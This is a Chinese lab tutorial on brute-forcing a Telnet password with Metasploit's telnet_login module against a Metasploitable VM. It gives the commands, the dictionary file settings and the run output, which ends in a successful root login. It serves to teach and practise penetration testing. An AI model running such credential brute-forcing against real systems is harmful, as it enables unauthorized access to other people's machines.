
# 破解TELNET密码

## 一 、启动msfconsole，查看可用的telnet攻击模块
攻击机：kali：192.168.1.149<br />目标机：Metasploitable：192.168.1.18

```
root@kali222:~# msfconsole
msf5 > search telnet
```
<br />![](https://img-blog.csdnimg.cn/2020060615582855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=VoOCG&originHeight=449&originWidth=1355&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 二、在这里我们使用auxiliary/scanner/telnet/telnet_login模块
![](https://img-blog.csdnimg.cn/20200606160021859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=MFPu8&originHeight=251&originWidth=861&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 三、应用攻击模块并查看模块需要的配置
```
msf5 > use auxiliary/scanner/telnet/telnet_login
msf5 auxiliary(scanner/telnet/telnet_login) > show options
```

![](https://img-blog.csdnimg.cn/20200606160222373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=QRfdJ&originHeight=439&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 四、利用提前设置好的用户和密码字典进行破解
```
msf5 auxiliary(scanner/telnet/telnet_login) > set rhosts 192.168.1.18
msf5 auxiliary(scanner/telnet/telnet_login) > set user_file  /user.txt
msf5 auxiliary(scanner/telnet/telnet_login) > set pass_file  /pass.txt
```
<br />![](https://img-blog.csdnimg.cn/20200606160347323.png#crop=0&crop=0&crop=1&crop=1&id=F2Lje&originHeight=117&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 五、开始启动爆破
```
msf5 auxiliary(scanner/telnet/telnet_login) > exploit
```
<br />![](https://img-blog.csdnimg.cn/20200606160445121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=K0GJM&originHeight=275&originWidth=839&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```

msf5 auxiliary(scanner/telnet/telnet_login) > exploit 

[!] 192.168.1.18:23       - No active DB -- Credential data will not be saved!
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: zs:1 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: zs:password (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: zs:123 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: zs:123456 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: zs: (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: admin:1 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: admin:password (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: admin:123 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: admin:123456 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: admin: (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: administrator:1 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: administrator:password (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: administrator:123 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: administrator:123456 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: administrator: (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: :1 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: :password (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: :123 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: :123456 (Incorrect: )
[-] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN FAILED: : (Incorrect: )
[+] 192.168.1.18:23       - 192.168.1.18:23 - LOGIN Successful:root :123456 
[*] 192.168.1.18:23       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
最后可以看到破解成功，用户名为：root，密码为：123456
